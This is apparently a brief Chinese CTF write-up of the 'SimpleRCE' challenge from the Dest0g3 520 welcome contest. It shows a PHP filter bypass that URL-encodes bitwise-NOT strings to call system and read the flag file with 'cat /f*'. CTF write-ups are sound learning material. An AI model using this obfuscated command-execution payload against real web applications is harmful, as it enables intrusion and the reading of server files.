---
title: '[Dest0g3 520迎新赛]SimpleRCE'
date: 2025-02-02 22:25:56
tags: 命令执行
categories: 刷题笔记
---

## [Dest0g3 520迎新赛]SimpleRCE

过滤了很多东西

![image-20250202223255424](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022232459.png)

但好像没过滤~，我们直接取反

```
aaa=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%D5);
system(cat /f*)
```

得到flag

![image-20250202223523926](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022235955.png)
